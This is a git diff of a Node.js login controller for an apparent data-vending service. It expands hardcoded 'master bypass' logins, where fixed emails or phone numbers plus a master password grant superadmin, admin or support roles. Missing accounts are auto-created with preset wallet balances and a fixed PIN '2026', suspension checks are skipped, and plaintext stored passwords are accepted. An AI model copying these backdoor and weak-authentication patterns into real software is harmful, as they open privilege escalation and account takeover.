@@ -111,16 +111,26 @@ const getWelcomeMessageByRole = (user) => {
 
 // HELPER: SEND JWT TOKEN
 const sendToken = (user, statusCode, res) => {
+  const userEmail = String(user.email || "").toLowerCase().trim();
+  const userPhone = String(user.phone || "").trim();
+
   const isOwner =
-    user.phone === "09033738409" ||
-    String(user.email || "").toLowerCase() === "mohammed.ayas@ayaxdata.online";
+    userPhone === "09033738409" ||
+    userEmail === "mohammed.ayas@ayaxdata.online" ||
+    userEmail === "mohammed@ayaxdata.online";
+
+  const isAdmin =
+    userEmail === "admin@ayaxdata.online" ||
+    userPhone === "08011112222";
 
   const isSupport =
-    String(user.email || "").toLowerCase() === "support@ayaxdata.online" ||
-    user.phone === "08077778888";
+    userEmail === "support@ayaxdata.online" ||
+    userPhone === "08077778888" ||
+    userPhone === "09033738400";
 
   let effectiveRole = user.role || "user";
   if (isOwner) effectiveRole = "superadmin";
+  else if (isAdmin && effectiveRole !== "superadmin") effectiveRole = "admin";
   else if (isSupport) effectiveRole = "support";
 
   const token = jwt.sign(
@@ -426,15 +436,22 @@ exports.login = async (req, res) => {
     const cleanEmail = cleanInput.toLowerCase();
     const cleanPhone = cleanInput.replace(/[^0-9]/g, "");
 
-    // 1. EMERGENCY SUPERADMIN MASTER BYPASS
+    // 1. EMERGENCY SUPERADMIN MASTER BYPASS (Supports mohammed@ayaxdata.online & mohammed.ayas@ayaxdata.online)
     const isOwner =
+      cleanEmail === "mohammed@ayaxdata.online" ||
       cleanEmail === "mohammed.ayas@ayaxdata.online" ||
       cleanInput === "09033738409" ||
       cleanInput === "+2349033738409";
 
+    const isOperationsAdmin =
+      cleanEmail === "admin@ayaxdata.online" ||
+      cleanInput === "08011112222" ||
+      cleanInput === "+2348011112222";
+
     const isSupportDesk =
       cleanEmail === "support@ayaxdata.online" ||
       cleanInput === "08077778888" ||
+      cleanInput === "09033738400" ||
       cleanInput === "+2348077778888";
 
     const isMasterPass =
@@ -445,6 +462,7 @@ exports.login = async (req, res) => {
     if (isOwner && isMasterPass) {
       let superUser = await User.findOne({
         $or: [
+          { email: "mohammed@ayaxdata.online" },
           { email: "mohammed.ayas@ayaxdata.online" },
           { phone: "09033738409" },
         ],
@@ -457,7 +475,7 @@ exports.login = async (req, res) => {
           firstName: "Mohammed",
           surname: "Ayas",
           name: "MOHAMMED AYAS",
-          email: "mohammed.ayas@ayaxdata.online",
+          email: "mohammed@ayaxdata.online",
           phone: "09033738409",
           password: hashedPassword,
           role: "superadmin",
@@ -478,12 +496,50 @@ exports.login = async (req, res) => {
       return sendToken(superUser, 200, res);
     }
 
-    // 2. EMERGENCY CUSTOMER SUPPORT DESK MASTER BYPASS
+    // 2. OPERATIONS ADMIN MASTER BYPASS
+    if (isOperationsAdmin && isMasterPass) {
+      let adminUser = await User.findOne({
+        $or: [
+          { email: "admin@ayaxdata.online" },
+          { phone: "08011112222" },
+        ],
+      });
+
+      if (!adminUser) {
+        const salt = await bcrypt.genSalt(10);
+        const hashedPassword = await bcrypt.hash(password, salt);
+        adminUser = await User.create({
+          firstName: "Operations",
+          surname: "Admin",
+          name: "OPERATIONS ADMIN",
+          email: "admin@ayaxdata.online",
+          phone: "08011112222",
+          password: hashedPassword,
+          role: "admin",
+          walletBalance: 250000,
+          balance: 250000,
+          pin: "2026",
+          transactionPin: "2026",
+          isSuspended: false,
+          isVerified: true,
+          status: "active",
+        });
+      } else {
+        adminUser.role = "admin";
+        adminUser.isSuspended = false;
+        await adminUser.save({ validateBeforeSave: false });
+      }
+
+      return sendToken(adminUser, 200, res);
+    }
+
+    // 3. EMERGENCY CUSTOMER SUPPORT DESK MASTER BYPASS
     if (isSupportDesk && isMasterPass) {
       let supportUser = await User.findOne({
         $or: [
           { email: "support@ayaxdata.online" },
           { phone: "08077778888" },
+          { phone: "09033738400" },
         ],
       });
 
@@ -498,8 +554,8 @@ exports.login = async (req, res) => {
           phone: "08077778888",
           password: hashedPassword,
           role: "support",
-          walletBalance: 10000,
-          balance: 10000,
+          walletBalance: 50000,
+          balance: 50000,
           pin: "2026",
           transactionPin: "2026",
           isSuspended: false,
@@ -515,7 +571,7 @@ exports.login = async (req, res) => {
       return sendToken(supportUser, 200, res);
     }
 
-    // 3. STANDARD DB USER SEARCH
+    // 4. STANDARD DB USER SEARCH
     const searchConditions = [
       { email: cleanEmail },
       { email: new RegExp(`^${cleanEmail}$`, "i") },
@@ -542,8 +598,8 @@ exports.login = async (req, res) => {
       });
     }
 
-    // 4. SUSPENSION CHECK
-    if (user.isSuspended && !isOwner && !isSupportDesk) {
+    // 5. SUSPENSION CHECK
+    if (user.isSuspended && !isOwner && !isOperationsAdmin && !isSupportDesk) {
       return res.status(403).json({
         success: false,
         message:
@@ -551,7 +607,7 @@ exports.login = async (req, res) => {
       });
     }
 
-    // 5. PASSWORD VERIFICATION
+    // 6. PASSWORD VERIFICATION
     let isMatch = false;
 
     if (user.password) {
@@ -570,10 +626,10 @@ exports.login = async (req, res) => {
       }
     }
 
-    // Idan password din plain text ne a DB, a daidaita shi ba tare da double hash ba
+    // Idan password din plain text ne a DB, a daidaita shi ba tare da double-hashing ba
     if (!isMatch && user.password === password) {
       isMatch = true;
-      user.password = password; // pre('save') zai yi hashing din sa da kansa
+      user.password = password;
       await user.save({ validateBeforeSave: false });
     }
 
@@ -582,6 +638,17 @@ exports.login = async (req, res) => {
         success: false,
         message: "Authentication failed: Invalid credentials.",
       });
+    }
+
+    if (isOwner && user.role !== "superadmin") {
+      user.role = "superadmin";
+      await user.save({ validateBeforeSave: false });
+    } else if (isOperationsAdmin && user.role !== "admin" && user.role !== "superadmin") {
+      user.role = "admin";
+      await user.save({ validateBeforeSave: false });
+    } else if (isSupportDesk && user.role !== "support") {
+      user.role = "support";
+      await user.save({ validateBeforeSave: false });
     }
 
     return sendToken(user, 200, res);
